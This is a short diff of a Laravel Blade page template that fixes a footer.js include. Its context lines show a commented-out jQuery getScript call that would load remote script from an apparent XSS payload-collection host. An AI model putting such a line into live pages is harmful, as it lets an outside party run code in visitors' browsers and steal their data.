@@ -8,7 +8,7 @@
 {{-- PLUGIN SWEETALERT 2 --}}
 <script src="{{ asset('vendor') }}/sweetalerts2/custom-sweetalert.js"></script>
 <script src="{{ asset('vendor') }}/sweetalerts2/sweetalerts2.min.js"></script>
-<link rel="stylesheet" href="{{ asset('dist') }}/custom/footer.js">
+<script src="{{ asset('dist') }}/custom/footer.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
 {{-- <script>
     $.getScript("//xss.report/c/kyouma052")
